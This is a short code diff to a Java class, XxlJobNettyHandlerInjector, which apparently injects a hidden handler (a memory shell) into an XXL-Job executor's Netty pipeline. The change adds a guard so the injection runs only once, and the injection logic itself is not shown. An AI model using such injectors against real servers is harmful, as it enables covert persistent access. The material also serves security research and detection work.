@@ -28,6 +28,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel> {
     private String msg = "";
+    private static boolean ok = false;
 
     public String getClassName() {
         return "{{className}}";
@@ -38,12 +39,16 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     }
 
     public XxlJobNettyHandlerInjector() {
+        if (ok) {
+            return;
+        }
         try {
             inject();
             msg += "[/*] ready\n";
         } catch (Throwable e) {
             msg += "failed " + getErrorMessage(e) + "\n";
         }
+        ok = true;
         System.out.println(msg);
     }
 
